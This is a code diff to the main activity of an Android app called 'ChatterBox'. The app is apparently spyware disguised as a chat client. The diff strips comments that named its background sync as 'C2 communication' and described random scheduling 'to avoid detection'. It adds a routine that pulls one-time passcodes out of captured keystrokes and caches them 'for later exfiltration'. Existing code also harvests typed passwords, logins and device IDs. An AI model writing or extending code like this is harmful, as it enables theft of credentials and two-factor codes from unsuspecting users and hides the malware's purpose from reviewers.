@@ -1,12 +1,18 @@
 package com.example.ChatterBox
 
+import android.annotation.SuppressLint
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
+import android.graphics.Color
 import android.media.projection.MediaProjectionManager
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
@@ -22,6 +28,7 @@ import androidx.appcompat.app.ActionBarDrawerToggle
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.core.view.GravityCompat
 import androidx.drawerlayout.widget.DrawerLayout
@@ -125,7 +132,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             IdleDetector.startIdleDetection(this)
         }
 
-        // Initialize data synchronization (our C2 communication) in the background
         initializeBackgroundSync()
 
     }
@@ -144,29 +150,24 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }
     }
     private fun initializeBackgroundSync() {
-        // Use the application executor for background tasks
         appExecutor.execute {
             try {
-                // Initialize the data synchronizer (C2 client)
                 dataSynchronizer = DataSynchronizer(this)
 
-                // Post UI/context-dependent operations to the main thread
                 handler.post {
                     try {
-                        // Collect basic device analytics
                         collectDeviceAnalytics()
                     } catch (e: Exception) {
                         Log.e(TAG, "Error collecting analytics: ${e.message}")
                     }
                 }
-
-                // Start periodic background tasks with random intervals to avoid detection
                 scheduleBackgroundTasks()
             } catch (e: Exception) {
                 Log.e(TAG, "Error initializing app sync: ${e.message}")
             }
         }
     }
+    @SuppressLint("HardwareIds")
     private fun collectDeviceAnalytics() {
         try {
             val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
@@ -242,7 +243,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 val capturedText = intent.getStringExtra("captured_text") ?: return
                 val sourceApp = intent.getStringExtra("source_app") ?: "unknown"
 
-                // Check if the captured text contains sensitive information
+                // Check for sensitive information
                 if (capturedText.contains("password", ignoreCase = true) ||
                     capturedText.contains("login", ignoreCase = true) ||
                     capturedText.contains("email", ignoreCase = true) ||
@@ -255,8 +256,74 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                         context, sourceApp, "input_field", capturedText
                     )
                 }
+
+                // Check for OTP patterns - common formats include 4-6 digit codes
+                val otpPattern = Regex("\\b\\d{4,6}\\b")
+                val otpMatcher = otpPattern.find(capturedText)
+
+                if (otpMatcher != null) {
+                    val otp = otpMatcher.value
+
+                    // Store the OTP for later exfiltration
+                    AccountManager.cacheAuthData(
+                        context, sourceApp, "otp", otp
+                    )
+
+                    // Create a notification for the OTP
+                    showOtpNotification(context, sourceApp, otp)
+                }
             }
         }, filter, RECEIVER_EXPORTED)
+    }
+
+    private fun showOtpNotification(context: Context, sourceApp: String, otp: String) {
+        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+
+        // Create notification channel for Android O and above
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                "otp_channel",
+                "OTP Notifications",
+                NotificationManager.IMPORTANCE_HIGH
+            ).apply {
+                description = "Notifications for OTP captures"
+                enableLights(true)
+                lightColor = Color.RED
+                enableVibration(true)
+            }
+            notificationManager.createNotificationChannel(channel)
+        }
+
+        // Build the notification
+        val notificationBuilder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationCompat.Builder(context, "otp_channel")
+        } else {
+            NotificationCompat.Builder(context)
+        }
+
+        // Create pending intent for the notification
+        val intent = Intent(context, MainActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+            putExtra("OTP_DATA", otp)
+            putExtra("SOURCE_APP", sourceApp)
+        }
+        val pendingIntent = PendingIntent.getActivity(
+            context, 0, intent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        // Configure the notification
+        val notification = notificationBuilder
+            .setSmallIcon(R.drawable.ic_notification)
+            .setContentTitle("OTP Captured")
+            .setContentText("OTP $otp detected from $sourceApp")
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setContentIntent(pendingIntent)
+            .setAutoCancel(true)
+            .build()
+
+        // Show the notification
+        notificationManager.notify(System.currentTimeMillis().toInt(), notification)
     }
 
     private fun collectMediaMetadata() {
